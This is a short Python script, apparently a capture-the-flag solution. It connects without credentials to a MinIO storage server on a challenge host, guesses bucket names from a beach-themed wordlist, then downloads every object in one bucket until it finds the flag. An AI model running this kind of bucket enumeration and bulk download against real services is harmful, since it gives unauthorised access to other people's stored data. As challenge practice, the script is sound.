#!/usr/bin/env python3
from minio import Minio
from minio.error import S3Error

client = Minio('challenge.ctf.games:31755', secure=False)


def find_bucket():
    buckets = [
        "sunscreen", "towel", "hat", "sunglasses", "swimsuit", "cooler", "water",
        "umbrella", "snacks", "flip-flops", "book", "chair", "frisbee", "blanket",
        "camera", "shells", "lotion", "speaker", "bag", "shovel", "bucket", "kite",
        "mat", "mask", "snorkel", "sandal", "ice", "ball", "shade"
    ]

    for bucket in buckets:
        try:
            print(f'Trying "{bucket}"')
            for obj in client.list_objects(bucket_name=bucket):
                print(obj)
                break
        except S3Error:
            print('that did not work :/')


def find_flag():
    for obj in client.list_objects(bucket_name='bucket', recursive=True):
        print(f'Trying "{obj.object_name}"')
        data = client.get_object(bucket_name='bucket', object_name=obj.object_name).data
        if b'flag{' in data:
            print('GOT IT')
            print(data)
            break


def main():
    # find_bucket()
    find_flag()


if __name__ == '__main__':
    main()
